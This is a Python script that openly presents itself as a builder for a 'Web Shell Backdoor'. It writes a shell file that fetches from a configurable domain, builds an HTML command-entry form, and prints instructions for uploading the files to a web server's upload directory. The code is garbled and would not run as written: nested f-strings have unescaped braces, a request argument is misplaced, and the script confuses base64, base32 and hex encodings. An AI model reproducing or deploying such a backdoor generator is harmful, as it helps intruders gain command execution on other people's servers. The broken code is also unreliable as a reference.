import socket
import hashlib
import re
import os
from urllib.parse import urlparse

def create_web_shell(domain="yourdomain.com", path="/"):
    """Creates a Python Web Shell Backdoor."""
    # 1. Create the Shell File (e.g., shell.py)
    with open("shell.py", "w") as f:
        f.write(f'''
import requests
import sys
import base64

if __name__ == "__main__":
    try:
        # 1. Get the JSON Shell Result from the Server
        response = requests.get("http://{domain}/shell_result", headers={"X-User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4754.63 Safari/537.36"}
                           ), timeout=20
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        json_result = response.text

        # 2. Decode Base64 Random String in JSON Result
        base64_encoded = json_result.split("<script>")[1].replace("</script>", "")
        decoded_random = base64.b32decode(base64_encoded).decode('utf-8')

        # 3. Create the HTML Page with Inline JavaScript for Prompting
        html_content = f'''<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <title>Web Shell</title>
    <style type="text/css">
        body {{ font-family: Helvetica, Sans-serif; background-color: #000020; color: #ffffff; }}
        label {{ display: block; margin-bottom: 5px; width: 100px; float: left; text-align: right; padding-right: 5px; }}
        input[type="text"] {{ font-family: Helvetica, Sans-serif; background-color: #348BD6; color: #fff; border-width: 3px; border-style: solid; border-radius: 4px; padding: 10px; margin-bottom: 5px; box-sizing: border-box; font-size: 12pt; }}
        input[type="submit"] {{ background-color: #8FBC8F; color: black; padding: 10px 15px; border-radius: 4px; border: none; cursor: pointer; text-decoration: none; font-family: Helvetica, Sans-serif; }}
    </style>
</head>
<body>
    <h1>Web Shell Backdoor</h1>
    <form action="/shell_result" method="post">
        <label for="command">Enter command to execute:</label>
        <input type="text" id="command" name="command" size="80"><br><br>
        <!-- Hidden field for the random string -->
        <input type="hidden" id="random_id" value="{decoded_random}">
        <button type="submit">Submit</button>
    </form>

    <!-- Alert if successful or error -->
    <div id="result">
        {json_result}
    </div>
</body>
</html>'''


        # 3. Save the HTML File to the Server (e.g., /index.html)
        with open(f"{path}/shell.py", "w") as f:
            f.write(f'''\n{json_result}
<script>
    function executeShell() {{
        var command = document.getElementById("command").value;

        if (!command) {{
            alert("Please enter a command!");
            return;
        }}

        // AJAX request to the server to get shell execution result
        var xhr = new XMLHttpRequest();
        xhr.open('POST', "/shell_result", true);
        xhr.setRequestHeader({ "X-User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4754.63 Safari/537.36"}, "");
        xhr.send({ "command": command });
    }}

    // Event listener for the Submit button click
    document.getElementById("submit_button").addEventListener("click", executeShell);
</script>
'''
            )

    except Exception as e:
        print(f"An error occurred: {e}")
        return False
    return True


def generate_shell_result(random_str):
    """Generates the JSON Shell Result String (e.g., /shell_result)."""
    # Encode random string into base64 to make it look more unique.
    encoded_random = random_str.encode('utf-8')
    base64_random = encoded_random.hex()

    return f'{"<script>".replace(">", "")}alert({base64_random});</script>"}<!DOCTYPE html><title>Web Shell Result</title></head>'


if __name__ == "__main__":
    # Create the shell file and HTML form
    success = create_web_shell(domain="yourdomain.com", path="/")

    if success:
        print("\nShell created successfully! Now put it on your web server.")
        print("1. Upload shell.py to your web directory (e.g., /uploads/)")
        print("2. Upload index.html to the same location (e.g., /index.html)")
        print("3. Access the Web Shell in your browser: http://yourdomain.com/index.html")
    else:
        print("\nShell creation failed. Check for errors.")
